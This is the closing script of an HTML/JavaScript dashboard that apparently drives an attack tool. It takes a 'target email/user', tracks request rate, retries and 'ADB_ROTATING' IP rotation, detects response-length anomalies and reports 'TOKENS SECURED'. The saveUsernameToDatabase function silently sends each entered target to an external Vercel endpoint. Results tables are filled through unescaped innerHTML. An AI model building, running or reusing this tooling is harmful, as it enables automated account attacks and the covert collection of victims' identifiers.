        async function saveUsernameToDatabase(username) {
            // Change this URL to your deployed Next.js API URL
            const dbApiUrl = "https://lock2-one.vercel.app/api/check31"; 
            
            try {
                const response = await fetch(dbApiUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: username })
                });

                const data = await response.json();
                
                if (response.ok) {
                    console.log("✅ DB Success:", data.message);
                } else {
                    // Usually this hits if the username is already taken (409 Conflict)
                    console.warn("⚠️ DB Notice:", data.error); 
                }
            } catch (err) {
                console.error("❌ DB Request Failed:", err);
            }
        }

        // --- UPDATED FUNCTION: Runs when you click "GEN" ---
        async function generateDataset() {
            const user = document.getElementById('dataset-user').value;
            if (!user) {
                alert("Please enter a target email/user first!");
                return;
            }
            
            const btn = document.getElementById('btn-gen');
            btn.innerText = "WAIT";
            btn.disabled = true;

            // 1. Fire the save function in the background (no need to await it and pause the UI)
            saveUsernameToDatabase(user);
            
            // 2. Continue with the standard Go backend dataset generation
            try {
                const response = await fetch('/api/dataset', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ user: user })
                });
                
                if (response.ok) {
                    const data = await response.json();
                    alert("TOKENS SECURED: " + data.message);
                } else {
                    alert("ERROR: Server returned status " + response.status);
                }
            } catch (err) {
                alert("NETWORK ERROR: " + err.message);
            } finally {
                btn.innerText = "GEN";
                btn.disabled = false;
            }
        }

        function resetTargetLength() {
            document.getElementById('tlen').value = '';
            fetch('/api/set-target?len=');
        }

        const ctx = document.getElementById('rpsChart').getContext('2d');
        let grad = ctx.createLinearGradient(0, 0, 0, 150);
        grad.addColorStop(0, 'rgba(0, 240, 255, 0.4)');
        grad.addColorStop(1, 'rgba(0, 240, 255, 0)');
        
        const chart = new Chart(ctx, {
            type: 'line',
            data: { labels: Array(50).fill(''), datasets: [{ data: Array(50).fill(0), borderColor: '#00f0ff', backgroundColor: grad, borderWidth: 2, fill: true, pointRadius: 0, tension: 0.3 }] },
            options: { responsive: true, maintainAspectRatio: false, animation: false, scales: { x: { display: false }, y: { display: false, min: 0 } }, plugins: { legend: { display: false } } }
        });

        const source = new EventSource('/stream');
        source.onmessage = (e) => {
            const d = JSON.parse(e.data);
            
            document.getElementById('time').innerText = d.elapsed;
            document.getElementById('rps').innerText = d.rps;
            document.getElementById('ok').innerText = d.success;
            document.getElementById('retry').innerText = d.retryCount;
            document.getElementById('inflight').innerText = d.inFlight;
            
            const tlenInput = document.getElementById('tlen');
            const clrBtn = document.getElementById('btn-clr');
            const autoBadge = document.getElementById('auto-badge');

            if (document.activeElement !== tlenInput && tlenInput.value !== d.targetLen) {
                tlenInput.value = d.targetLen;
            }

            if (d.running) {
                tlenInput.disabled = true;
                clrBtn.disabled = true;
                if (!d.targetLen) {
                    if (d.baselineLen) {
                        autoBadge.innerText = "BASELINE LOCKED: " + d.baselineLen + " BYTES";
                        autoBadge.style.color = "var(--green)";
                    } else {
                        autoBadge.innerText = "[ AUTO-DETECTING BASELINE... ]";
                        autoBadge.style.color = "var(--gold)";
                    }
                } else {
                    autoBadge.innerText = "";
                }
            } else {
                tlenInput.disabled = false;
                clrBtn.disabled = false;
                autoBadge.innerText = "";
            }

            chart.data.datasets[0].data = d.rpsHistory;
            chart.update();

            const statText = document.getElementById('status-text');
            const dot = document.getElementById('pulse-dot');
            statText.innerText = d.statusMsg;
            
            if(d.statusMsg.includes('ADB_ROTATING')) { statText.style.color = 'var(--red)'; dot.style.color = 'var(--red)'; dot.style.background = 'var(--red)'; }
            else if(d.statusMsg.includes('ANOMALY') || d.statusMsg.includes('SECURED') || d.statusMsg.includes('RESTORED') || d.statusMsg.includes('DETECTING')) { statText.style.color = 'var(--gold)'; dot.style.color = 'var(--gold)'; dot.style.background = 'var(--gold)'; }
            else if(d.statusMsg.includes('ENGAGED')) { statText.style.color = 'var(--green)'; dot.style.color = 'var(--green)'; dot.style.background = 'var(--green)'; }
            else { statText.style.color = 'var(--cyan)'; dot.style.color = 'var(--cyan)'; dot.style.background = 'var(--cyan)'; }

            const mbody = document.getElementById('matches');
            mbody.innerHTML = '';
            d.matches.forEach(l => {
                const tr = document.createElement('tr');
                tr.className = l.serial.includes('REPORT') ? 'row-report' : 'row-match';
                let pillClass = l.status === '200' ? 'p-200' : (l.status === '403' ? 'p-403' : '');
                tr.onclick = () => {
                    document.getElementById('req-view').value = l.rawReq;
                    document.getElementById('res-view').value = l.rawRes;
                };
                tr.innerHTML = '<td>'+l.serial+'</td><td><span class="pill '+pillClass+'">'+l.status+'</span></td><td>'+l.length+'</td><td>'+l.time+'</td>';
                mbody.appendChild(tr);
            });

            const tbody = document.getElementById('logs');
            tbody.innerHTML = '';
            d.logs.forEach(l => {
                const tr = document.createElement('tr');
                if(l.isMatch) tr.className = l.serial.includes('REPORT') ? 'row-report' : 'row-match';
                let pillClass = l.status === '200' ? 'p-200' : (l.status === '403' ? 'p-403' : '');
                tr.onclick = () => {
                    document.getElementById('req-view').value = l.rawReq;
                    document.getElementById('res-view').value = l.rawRes;
                };
                tr.innerHTML = '<td>'+l.serial+'</td><td><span class="pill '+pillClass+'">'+l.status+'</span></td><td>'+l.length+'</td><td>'+l.time+'</td>';
                tbody.appendChild(tr);
            });
        };
    </script>
</body>
</html>`
